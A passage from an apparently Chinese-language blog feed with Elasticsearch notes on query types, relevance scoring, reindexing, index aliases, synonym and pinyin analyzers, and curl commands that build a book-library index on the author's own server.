class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GET /library/_search/</span><br><span class="line">&#123;</span><br><span class="line">    &quot;query&quot;: &#123;</span><br><span class="line">        &quot;match_all&quot;: &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>match 查询（模糊）  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET /library/_search/</span><br><span class="line">&#123;</span><br><span class="line">    &quot;query&quot;: &#123;</span><br><span class="line">        &quot;match&quot;: &#123;</span><br><span class="line">            &quot;title&quot;: &quot;陈忠实&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>multi_match 多个字段查询应用一个查询条件  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET /library/_search/</span><br><span class="line">&#123;</span><br><span class="line">    &quot;query&quot;: &#123;</span><br><span class="line">        &quot;multi_match&quot;: &#123;</span><br><span class="line">            &quot;query&quot;: &quot;陈忠实&quot;,</span><br><span class="line">            &quot;fields&quot;: [&quot;title&quot;, &quot;author&quot;]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>range 查询找出那些落在指定区间内的数字或者时间  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;range&quot;: &#123;</span><br><span class="line">        &quot;age&quot;: &#123;</span><br><span class="line">            &quot;gte&quot;:  20,</span><br><span class="line">            &quot;lt&quot;:   30</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>term 查询被用于精确值 匹配，这些精确值可能是数字、时间、布尔或者那些<code>not_analyzed</code>的字符串  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123; &quot;term&quot;: &#123; &quot;age&quot;:    26           &#125;&#125;</span><br><span class="line">&#123; &quot;term&quot;: &#123; &quot;date&quot;:   &quot;2014-09-01&quot; &#125;&#125;</span><br><span class="line">&#123; &quot;term&quot;: &#123; &quot;public&quot;: true         &#125;&#125;</span><br><span class="line">&#123; &quot;term&quot;: &#123; &quot;tag&quot;:    &quot;full_text&quot;  &#125;&#125;</span><br></pre></td></tr></table></figure></li><li>terms 查询和 term 查询一样，但它允许你指定多值进行匹配。  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123; &quot;terms&quot;: &#123; &quot;tag&quot;: [ &quot;search&quot;, &quot;full_text&quot;, &quot;nosql&quot; ] &#125;&#125;</span><br></pre></td></tr></table></figure></li><li>exists 查询和 missing 查询被用于查找那些指定字段中有值 (exists) 或无值 (missing) 的文档。  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;exists&quot;:   &#123;</span><br><span class="line">        &quot;field&quot;:    &quot;title&quot;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>filter</li></ul><h3 id="排序"><a href="#排序" class="headerlink" title="排序"></a>排序</h3><p>ElasticSearch 默认排序是<code>_score</code>降序。</p><blockquote><p>如果我们不需要评分，可以使用 <code>constant_score</code> 查询进行替代，这将让所有文档应用一个恒定分数（默认为 1 ）。如果我们不使用默认的<code>_score</code>排序，那么 <code>_score</code> 和 <code>max_score</code> 字段都是 null 。 计算 <code>_score</code> 的花销巨大，通常仅用于排序； 我们并不根据相关性排序，所以记录 <code>_score</code> 是没有意义的。如果无论如何你都要计算<code> _score</code> ， 你可以将 <code>track_scores</code> 参数设置为 true</p></blockquote><h3 id="相关性"><a href="#相关性" class="headerlink" title="相关性"></a>相关性</h3><p>每个文档都有相关性评分，用一个正浮点数字段 _score 来表示 。 _score 的评分越高，相关性越高。</p><ul><li><p>检索词频率<br>  检索词在该字段出现的频率？出现频率越高，相关性也越高。 字段中出现过 5 次要比只出现过 1 次的相关性高。</p></li><li><p>反向文档频率<br>  每个检索词在索引中出现的频率？频率越高，相关性越低。检索词出现在多数文档中会比出现在少数文档中的权重更低。</p></li><li><p>字段长度准则<br>  字段的长度是多少？长度越长，相关性越低。 检索词出现在一个短的 title 要比同样的词出现在一个长的 content 字段权重更大。</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">查看相关性是如何计算的</span><br><span class="line"></span><br><span class="line">GET /_search?explain </span><br><span class="line">&#123;</span><br><span class="line">   &quot;query&quot;: &#123; &quot;match&quot; : &#123; &quot;tweet&quot; : &quot;honeymoon&quot; &#125; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="重建索引"><a href="#重建索引" class="headerlink" title="重建索引"></a>重建索引</h3><p><a href="https://www.elastic.co/guide/en/elasticsearch/reference/current/docs-reindex.html">https://www.elastic.co/guide/en/elasticsearch/reference/current/docs-reindex.html</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">POST _reindex</span><br><span class="line">&#123;</span><br><span class="line">  &quot;source&quot;: &#123;</span><br><span class="line">    &quot;index&quot;: &quot;twitter&quot;</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;dest&quot;: &#123;</span><br><span class="line">    &quot;index&quot;: &quot;new_twitter&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="索引别名"><a href="#索引别名" class="headerlink" title="索引别名"></a>索引别名</h3><p><code>my_index</code> 指向 <code>my_index_v1</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PUT /my_index_v1 </span><br><span class="line">PUT /my_index_v1/_alias/my_index</span><br></pre></td></tr></table></figure><h3 id="match精度"><a href="#match精度" class="headerlink" title="match精度"></a>match精度</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&quot;match&quot;: &#123;</span><br><span class="line">    &quot;title&quot;: &#123;</span><br><span class="line">        &quot;query&quot;: &quot;css 权威指南&quot;,</span><br><span class="line">        &quot;operator&quot;: &quot;and&quot;, // 操作符 关键词匹配是or还是and </span><br><span class="line">        &quot;minimum_should_match&quot;: &quot;70%&quot; // 至少匹配多少个关键词</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="同义词"><a href="#同义词" class="headerlink" title="同义词"></a>同义词</h3><blockquote><p><code>synonyms_path</code>相对于<code>elasticsearch</code>的<code>config</code>文件目录，一般位于<code>/etc/elasticsearch</code>。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">PUT /[index_name]</span><br><span class="line">&#123;</span><br><span class="line">    &quot;settings&quot;: &#123;</span><br><span class="line">        &quot;analysis&quot;: &#123;</span><br><span class="line">            &quot;filter&quot;:      &#123; </span><br><span class="line">                &quot;synonym_filter&quot;: &#123;</span><br><span class="line">                    &quot;type&quot;: &quot;synonym&quot;, </span><br><span class="line">                    &quot;synonyms_path&quot;: &quot;analysis/synonyms.txt&quot;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="拼音"><a href="#拼音" class="headerlink" title="拼音"></a>拼音</h3><blockquote><p>汉字转拼音是不可逆的过程。<code>汉字</code>，<code>汗渍</code> 两者的拼音都是<code>hanzi</code>。当用户输入<code>汉字</code>是我们明确知道用户想搜什么，但是如果是拼音<code>hanzi</code>，这时无法准确推断用户的真实想法。这时搜索结果中可能<code>汉字</code>、<code>汗渍</code>都会出现。<br><a href="https://github.com/medcl/elasticsearch-analysis-pinyin">https://github.com/medcl/elasticsearch-analysis-pinyin</a></p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">PUT /[index_name]</span><br><span class="line">&#123;</span><br><span class="line">    &quot;settings&quot;: &#123;</span><br><span class="line">        &quot;number_of_shards&quot; :   4,</span><br><span class="line">        &quot;number_of_replicas&quot; : 1,</span><br><span class="line">        &quot;index.mapping.single_type&quot;: true,</span><br><span class="line">        &quot;analysis&quot;: &#123;</span><br><span class="line">            &quot;filter&quot;:      &#123; </span><br><span class="line">                &quot;synonym_filter&quot;: &#123;</span><br><span class="line">                    &quot;type&quot;: &quot;synonym&quot;, </span><br><span class="line">                    &quot;synonyms_path&quot;: &quot;analysis/synonyms.txt&quot;</span><br><span class="line">                &#125;,</span><br><span class="line">                &quot;pinyin_filter&quot;: &#123;</span><br><span class="line">                    &quot;type&quot;: &quot;pinyin&quot;,</span><br><span class="line">                    &quot;keep_first_letter&quot;: false,</span><br><span class="line">                    &quot;keep_full_pinyin&quot;: false,</span><br><span class="line">                    &quot;keep_joined_full_pinyin&quot;: true,</span><br><span class="line">                    &quot;keep_separate_first_letter&quot;: false,</span><br><span class="line">                    &quot;keep_original&quot;: true</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;analyzer&quot;:    &#123;</span><br><span class="line">                &quot;ik_smart_pinyin&quot;: &#123;</span><br><span class="line">                    &quot;type&quot;: &quot;custom&quot;,</span><br><span class="line">                    &quot;tokenizer&quot;: &quot;ik_smart&quot;,</span><br><span class="line">                    &quot;filter&quot;: [&quot;synonym_filter&quot;, &quot;pinyin_filter&quot;]</span><br><span class="line">                &#125;,</span><br><span class="line">                &quot;ik_max_word_pinyin&quot;: &#123;</span><br><span class="line">                    &quot;type&quot;: &quot;custom&quot;,</span><br><span class="line">                    &quot;tokenizer&quot;: &quot;ik_max_word&quot;,</span><br><span class="line">                    &quot;filter&quot;: [&quot;synonym_filter&quot;, &quot;pinyin_filter&quot;]</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="查看所有index"><a href="#查看所有index" class="headerlink" title="查看所有index"></a>查看所有index</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/_cat/indices</span><br></pre></td></tr></table></figure><h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><ol><li>创建索引</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">curl -XPUT &#x27;http://es.kekek.cc/library_20171204?pretty=true&#x27; -d &#x27;</span><br><span class="line">&#123;</span><br><span class="line">    &quot;settings&quot;: &#123;</span><br><span class="line">        &quot;number_of_shards&quot; :   4,</span><br><span class="line">        &quot;number_of_replicas&quot; : 1,</span><br><span class="line">        &quot;index.mapping.single_type&quot;: true,</span><br><span class="line">        &quot;analysis&quot;: &#123;</span><br><span class="line">            &quot;filter&quot;:      &#123; </span><br><span class="line">                &quot;synonym_filter&quot;: &#123;</span><br><span class="line">                    &quot;type&quot;: &quot;synonym&quot;, </span><br><span class="line">                    &quot;synonyms_path&quot;: &quot;analysis/synonyms.txt&quot;</span><br><span class="line">                &#125;,</span><br><span class="line">                &quot;pinyin_filter&quot;: &#123;</span><br><span class="line">                    &quot;type&quot;: &quot;chinese-pinyin&quot;</span><br><span class="line">                &#125;,</span><br><span class="line">                &quot;length_filter&quot;: &#123;</span><br><span class="line">                    &quot;type&quot;: &quot;length&quot;,</span><br><span class="line">                    &quot;min&quot;: 2</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;analyzer&quot;:    &#123;</span><br><span class="line">                &quot;ik_smart_pinyin&quot;: &#123;</span><br><span class="line">                    &quot;type&quot;: &quot;custom&quot;,</span><br><span class="line">                    &quot;tokenizer&quot;: &quot;ik_smart&quot;,</span><br><span class="line">                    &quot;filter&quot;: [&quot;length_filter&quot;, &quot;synonym_filter&quot;, &quot;pinyin_filter&quot;]</span><br><span class="line">                &#125;,</span><br><span class="line">                &quot;ik_max_word_pinyin&quot;: &#123;</span><br><span class="line">                    &quot;type&quot;: &quot;custom&quot;,</span><br><span class="line">                    &quot;tokenizer&quot;: &quot;ik_max_word&quot;,</span><br><span class="line">                    &quot;filter&quot;: [&quot;length_filter&quot;, &quot;synonym_filter&quot;, &quot;pinyin_filter&quot;]</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; &#x27;</span><br></pre></td></tr></table></figure><ol start="2"><li>创建 mapping</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line">curl -XPUT &#x27;http://es.kekek.cc/library_20171204/_mapping/book?pretty=true&#x27; -d &#x27;</span><br><span class="line">&#123;</span><br><span class="line">    &quot;dynamic&quot;: false,</span><br><span class="line">    &quot;properties&quot;: &#123;</span><br><span class="line">        &quot;title&quot;: &#123;</span><br><span class="line">            &quot;type&quot;: &quot;string&quot;,</span><br><span class="line">            &quot;analyzer&quot;: &quot;ik_smart_pinyin&quot;,</span><br><span class="line">            &quot;search_analyzer&quot;: &quot;ik_max_word_pinyin&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;subtitle&quot;: &#123;</span><br><span class="line">            &quot;type&quot;: &quot;string&quot;,</span><br><span class="line">            &quot;analyzer&quot;: &quot;ik_smart_pinyin&quot;,</span><br><span class="line">            &quot;search_analyzer&quot;: &quot;ik_max_word_pinyin&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;author&quot;: &#123;</span><br><span class="line">            &quot;type&quot;: &quot;string&quot;,</span><br><span class="line">            &quot;analyzer&quot;: &quot;ik_smart_pinyin&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;translator&quot;: &#123;</span><br><span class="line">            &quot;type&quot;: &quot;string&quot;,</span><br><span class="line">            &quot;analyzer&quot;: &quot;ik_smart_pinyin&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;rating&quot;: &#123;</span><br><span class="line">            &quot;type&quot;: &quot;object&quot;,</span><br><span class="line">            &quot;properties&quot;: &#123;</span><br><span class="line">                &quot;max&quot;: &#123; &quot;type&quot;: &quot;integer&quot;, &quot;index&quot;: &quot;no&quot; &#125;,</span><br><span class="line">                &quot;num_raters&quot;: &#123;&quot;type&quot;: &quot;integer&quot; &#125;,</span><br><span class="line">                &quot;average&quot;: &#123;&quot;type&quot;: &quot;float&quot; &#125;,</span><br><span class="line">                &quot;min&quot;: &#123;&quot;type&quot;: &quot;integer&quot;, &quot;index&quot;: &quot;no&quot;  &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;pubdate&quot;: &#123;</span><br><span class="line">            &quot;type&quot;: &quot;date&quot;,</span><br><span class="line">            &quot;index&quot;: &quot;no&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;tags&quot;: &#123;</span><br><span class="line">            &quot;type&quot;: &quot;string&quot;,</span><br><span class="line">            &quot;index&quot;: &quot;not_analyzed&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;isbn&quot;: &#123;</span><br><span class="line">            &quot;type&quot;: &quot;string&quot;,</span><br><span class="line">            &quot;index&quot;: &quot;not_analyzed&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;isbn10&quot;: &#123;</span><br><span class="line">            &quot;type&quot;: &quot;string&quot;,</span><br><span class="line">            &quot;index&quot;: &quot;no&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;isbn13&quot;: &#123;</span><br><span class="line">            &quot;type&quot;: &quot;string&quot;,</span><br><span class="line">            &quot;index&quot;: &quot;no&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;origin_title&quot;: &#123;</span><br><span class="line">            &quot;type&quot;: &quot;string&quot;,</span><br><span class="line">            &quot;index&quot;: &quot;no&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;image&quot;: &#123;</span><br><span class="line">            &quot;type&quot;: &quot;string&quot;,</span><br><span class="line">            &quot;index&quot;: &quot;no&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;binding&quot;: &#123;</span><br><span class="line">            &quot;type&quot;: &quot;string&quot;,</span><br><span class="line">            &quot;index&quot;: &quot;no&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;pages&quot;: &#123;</span><br><span class="line">            &quot;type&quot;: &quot;integer&quot;,</span><br><span class="line">            &quot;index&quot;: &quot;no&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;images&quot;: &#123;</span><br><span class="line">            &quot;type&quot;: &quot;object&quot;,</span><br><span class="line">            &quot;properties&quot;: &#123;</span><br><span class="line">                &quot;small&quot;: &#123;</span><br><span class="line">                    &quot;type&quot;: &quot;string&quot;,</span><br><span class="line">                    &quot;index&quot;: &quot;no&quot;</span><br><span class="line">                &#125;,</span><br><span class="line">                &quot;large&quot;: &#123;</span><br><span class="line">                    &quot;type&quot;: &quot;string&quot;,</span><br><span class="line">                    &quot;index&quot;: &quot;no&quot;</span><br><span class="line">                &#125;,</span><br><span class="line">                &quot;medium&quot;: &#123;</span><br><span class="line">                    &quot;type&quot;: &quot;string&quot;,</span><br><span class="line">                    &quot;index&quot;: &quot;no&quot;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;alt&quot;: &#123;</span><br><span class="line">            &quot;type&quot;: &quot;string&quot;,</span><br><span class="line">            &quot;index&quot;: &quot;no&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;origin_id&quot;: &#123;</span><br><span class="line">            &quot;type&quot;: &quot;integer&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;publisher&quot;: &#123;</span><br><span class="line">            &quot;type&quot;: &quot;string&quot;,</span><br><span class="line">            &quot;index&quot;: &quot;no&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;url&quot;: &#123;</span><br><span class="line">            &quot;type&quot;: &quot;string&quot;,</span><br><span class="line">            &quot;index&quot;: &quot;no&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;alt_title&quot;: &#123;</span><br><span class="line">            &quot;type&quot;: &quot;string&quot;,</span><br><span class="line">            &quot;index&quot;: &quot;no&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;series_id&quot;: &#123;</span><br><span class="line">            &quot;type&quot;: &quot;integer&quot;,</span><br><span class="line">            &quot;index&quot;: &quot;no&quot;</span><br><span class="line">        &#125;, </span><br><span class="line">        &quot;series_title&quot;: &#123;</span><br><span class="line">            &quot;type&quot;: &quot;string&quot;,</span><br><span class="line">            &quot;index&quot;: &quot;no&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;price&quot;: &#123;</span><br><span class="line">            &quot;type&quot;: &quot;string&quot;,</span><br><span class="line">            &quot;index&quot;: &quot;no&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;created_at&quot;: &#123;</span><br><span class="line">            &quot;type&quot;: &quot;date&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;updated_at&quot;: &#123;</span><br><span class="line">            &quot;type&quot;: &quot;date&quot;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125; &#x27;</span><br></pre></td></tr></table></figure><ol start="3"><li>重建索引</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">curl -POST &#x27;http://es.kekek.cc/_reindex&#x27; -d &#x27;</span><br><span class="line">&#123;</span><br><span class="line">    &quot;source&quot;: &#123;</span><br><span class="line">        &quot;index&quot;: &quot;books&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;dest&quot;: &#123;</span><br><span class="line">        &quot;index&quot;: &quot;library_20171204&quot;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#x27;</span><br></pre></td></tr></table></figure><ol start="4"><li>索引别名</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">curl -XPUT /library_20171204/_alias/library</span><br><span class="line">curl -XDELETE /library_20171129/_alias/library</span><br><span class="line"></span><br><span class="line">curl -POST &#x27;http://es.kekek.cc/_aliases&#x27; -d &#x27;</span><br><span class="line">&#123;</span><br><span class="line">    &quot;actions&quot; : [</span><br><span class="line">        &#123; &quot;remove&quot; : &#123; &quot;index&quot; : &quot;library_20171129&quot;, &quot;alias&quot; : &quot;library&quot; &#125; &#125;,</span><br><span class="line">        &#123; &quot;add&quot; : &#123; &quot;index&quot; : &quot;library_20171204&quot;, &quot;alias&quot; : &quot;library&quot; &#125; &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125; &#x27; </span><br></pre></td></tr></table></figure><ol start="5"><li>测试分词器</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">curl -XGET &#x27;http:/es.kekek.cc/library/_analyze?pretty=true&#x27; -d &#x27; </span><br><span class="line">&#123;</span><br><span class="line">  &quot;analyzer&quot;: &quot;ik_max_word_pinyin&quot;,  </span><br><span class="line">  &quot;text&quot;: &quot;白鹿原&quot;  </span><br><span class="line">&#125; &#x27;</span><br></pre></td></tr></table></figure><ol start="6"><li>查看查询计划</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">curl -XGET &#x27;http:/es.kekek.cc/library/_search?pretty=true&#x27; -d &#x27; </span><br><span class="line">&#123;</span><br><span class="line">    &quot;query&quot;: &#123;</span><br><span class="line">        &quot;bool&quot;: &#123;</span><br><span class="line">            &quot;must&quot;: &#123;</span><br><span class="line">                &quot;match&quot;: &#123;</span><br><span class="line">                    &quot;title&quot;: &#123;</span><br><span class="line">                        &quot;query&quot;: &quot;白鹿原&quot;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; &#x27;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> elasticsearch </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NPM</title>
      <link href="/post/npm.html"/>
      <url>/post/npm.html</url>
      
